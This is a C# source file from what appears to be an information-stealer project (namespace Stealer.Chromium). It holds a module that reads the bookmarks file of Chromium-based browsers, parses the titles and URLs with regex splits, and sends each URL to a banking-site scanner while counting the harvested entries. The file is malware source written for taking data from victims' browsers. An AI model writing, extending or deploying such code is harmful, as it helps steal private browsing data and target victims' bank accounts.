using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace Stealer.Chromium
{
    internal sealed class Parser
    {
        public static string separator = "\": \"";

        public static string RemoveLatest(string data)
        {
            return Regex.Split(Regex.Split(data, "\",")[0], "\"")[0];
        }

        public static bool DetectTitle(string data)
        {
            return data.Contains("\"name");
        }

        public static string Get(string data, int index)
        {
            try {
                return RemoveLatest(Regex.Split(data, separator)[index]);
            } catch (System.IndexOutOfRangeException) {
                return "Failed to parse url";
            }
        }
    }

    internal sealed class Bookmarks
    {
        /// <summary>
        /// Get bookmarks from chromium based browsers
        /// </summary>
        /// <param name="sBookmarks"></param>
        /// <returns>List with bookmarks</returns>
        public static List<Bookmark> Get(string sBookmarks)
        {
            try
            {
                List<Bookmark> bBookmarks = new List<Bookmark>();


                if (!File.Exists(sBookmarks))
                    return bBookmarks;

                string data = File.ReadAllText(sBookmarks, System.Text.Encoding.UTF8); // Load file content

                data = Regex.Split(data, "      \"bookmark_bar\": {")[1];
                data = Regex.Split(data, "      \"other\": {")[0];


                string[] payload = Regex.Split(data, "},");
                foreach (string parse in payload)
                    if (parse.Contains("\"name\": \"") &&
                        parse.Contains("\"type\": \"url\",") &&
                        parse.Contains("\"url\": \"http")
                    )
                    {
                        int index = 0;
                        foreach (string target in Regex.Split(parse, Parser.separator))
                        {
                            index++;
                            Bookmark bBookmark = new Bookmark();
                            if (Parser.DetectTitle(target))
                            {
                                bBookmark.sTitle = Parser.Get(parse, index);
                                bBookmark.sUrl = Parser.Get(parse, index + 2);

                                if (string.IsNullOrEmpty(bBookmark.sTitle))
                                    continue;
                                if (!string.IsNullOrEmpty(bBookmark.sUrl) && !bBookmark.sUrl.Contains("Failed to parse url"))
                                {
                                    // Analyze value
                                    Banking.ScanData(bBookmark.sUrl);
                                    Counter.Bookmarks++;
                                    bBookmarks.Add(bBookmark);
                                }
                            }
                                

                        }

                    }
                return bBookmarks;
            }
            catch { return new List<Bookmark>(); }
        }

    }
}
